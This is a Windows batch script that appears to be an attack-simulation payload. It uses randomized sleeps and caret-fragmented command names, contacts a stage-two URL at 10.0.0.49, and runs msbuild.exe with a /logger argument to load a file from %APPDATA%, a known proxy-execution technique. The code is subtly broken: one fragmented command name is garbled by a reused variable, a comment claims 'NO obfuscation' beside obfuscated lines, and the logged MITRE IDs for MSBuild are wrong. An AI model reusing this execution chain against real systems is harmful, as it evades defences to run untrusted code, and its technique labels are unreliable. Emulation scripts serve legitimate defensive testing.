@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NO obfuscation)
SET ybpdnn=%APPDATA%\8176\a1a7a7c3
SET qoqvdgp=https://10.0.0.49
SET xtztw=https://10.0.0.49/stage/2/icon.png?8176-7
SET ywdyrhd=ITZEL-S2BO
SET udhsoo=7
SET jkrfy=onenote.txt
SET xweoqe=8176

REM Script variables (random names)
SET lgpji=%APPDATA%\%udhsoo%\macula-simulations.log
SET kbrsyq=%RANDOM%

echo [%DATE% %TIME%][DEBUG][%ywdyrhd%]: script_start>> "%lgpji%" 2>nul

REM Initial random delay (45-75s)
SET /A dl1=%kbrsyq% %% 31 + 45
echo [%DATE% %TIME%][DEBUG][%ywdyrhd%]: initial_delay=!dl1!s>> "%lgpji%" 2>nul
timeout /t !dl1! /nobreak >nul

REM First check - heartbeat to external server
SET a=d1^0
SET b=f3
SET c=5e^
SET d=a2
SET e=8^6^7

echo [%DATE% %TIME%][DEBUG][%ywdyrhd%]: heartbeat_check_start>> "%lgpji%" 2>nul
SET q=a^-^k
SET w=-^s
SET e=-^o
SET r=n^u^l
%a%%b%%c%%d%%e% !q!!w!!e!!r! "%xtztw%"
IF !ERRORLEVEL! EQU 0 (
  SET jgfhws=1
  SET vwcyu=
) ELSE (
  SET jgfhws=0
  SET vwcyu=connection_failed
)
echo [%DATE% %TIME%][DEBUG][%ywdyrhd%]: heartbeat_result=!jgfhws! error=!vwcyu!>> "%lgpji%" 2>nul

REM Log TTP for heartbeat check
SET _time=!TIME: =0!
SET _timestamp=!DATE:~6,4!-!DATE:~3,2!-!DATE:~0,2! !_time:~0,2!:!_time:~3,2!:!_time:~6,2!.!_time:~9,2!
echo [!_timestamp!][%ywdyrhd%]: %udhsoo%-%xweoqe%-T1218.001|MSBuild=!jgfhws!:!vwcyu!>> "%lgpji%" 2>nul

REM Random delay 10-20s
SET /A dl2=%kbrsyq% %% 11 + 10
echo [%DATE% %TIME%][DEBUG][%ywdyrhd%]: mid_delay=!dl2!s>> "%lgpji%" 2>nul
ping -n !dl2! 127.0.0.1 >nul

REM Prepare MSBuild command with heavy fragmentation
SET m1=m^s^b
SET m2=u^i^l^d^.
SET m3=e^x^e
SET l1=^/^l^o^g^g^e^r^:^L^o^g^g^e^r^E^n^t^r^y^,
SET l2=^;^M^y^P^a^r^a^m^e^t^e^r^s^,^F^o^o

REM Construct full command
SET vbsh=!m1!!m2!!m3!
SET rshg=!l1!!ybpdnn!\\!jkrfy!!l2!

echo [%DATE% %TIME%][DEBUG][%ywdyrhd%]: msbuild_cmd=!vbsh! !rshg!>> "%lgpji%" 2>nul

REM Execute MSBuild
CALL !vbsh! !rshg!

REM Check result and log TTP
IF !ERRORLEVEL! EQU 0 (
  SET fpnlkt=1
  SET qkpups=
) ELSE (
  SET fpnlkt=0
  SET qkpups=msbuild_failed
)

SET _time=!TIME: =0!
SET _timestamp=!DATE:~6,4!-!DATE:~3,2!-!DATE:~0,2! !_time:~0,2!:!_time:~3,2!:!_time:~6,2!.!_time:~9,2!
echo [!_timestamp!][%ywdyrhd%]: %udhsoo%-%xweoqe%-T1218.002|Trusted Developer Utilities Proxy Execution=!fpnlkt!:!qkpups!>> "%lgpji%" 2>nul

REM Final delay 15-30s
SET /A dl3=%kbrsyq% %% 16 + 15
echo [%DATE% %TIME%][DEBUG][%ywdyrhd%]: final_delay=!dl3!s>> "%lgpji%" 2>nul
CHOICE /C Y /N /D Y /T !dl3! >nul

echo [%DATE% %TIME%][DEBUG][%ywdyrhd%]: script_complete>> "%lgpji%" 2>nul

ENDLOCAL